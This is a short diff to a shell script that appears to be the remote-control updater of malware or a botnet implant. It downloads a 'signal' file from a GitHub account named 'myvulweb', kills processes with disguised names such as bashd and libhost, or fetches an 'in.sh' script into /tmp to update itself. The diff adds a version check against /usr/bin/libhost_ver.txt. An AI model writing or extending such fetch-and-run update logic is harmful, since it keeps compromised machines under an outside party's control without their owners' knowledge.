@@ -4,6 +4,8 @@ wget https://raw.githubusercontent.com/myvulweb/singal/master/1.txt -O /tmp/sing
 ret=`cat /tmp/singal-test.txt`
 rm -rf /tmp/singal-test.txt
 
+cur_ver=`cat /usr/bin/libhost_ver.txt`
+echo $cur_ver
 echo $ret
 if [ "$ret" -eq 1 ]
 then
@@ -28,7 +30,7 @@ then
 	killall libhost
 	killall soexec
 	killall bashd
-elif [ "$ret" -eq 2 ]
+elif [ "$ret" -gt "$cur_ver" ]
 then
 	echo "need to update"
 	wget https://raw.githubusercontent.com/myvulweb/mysh/master/in.sh -O /tmp/in.sh
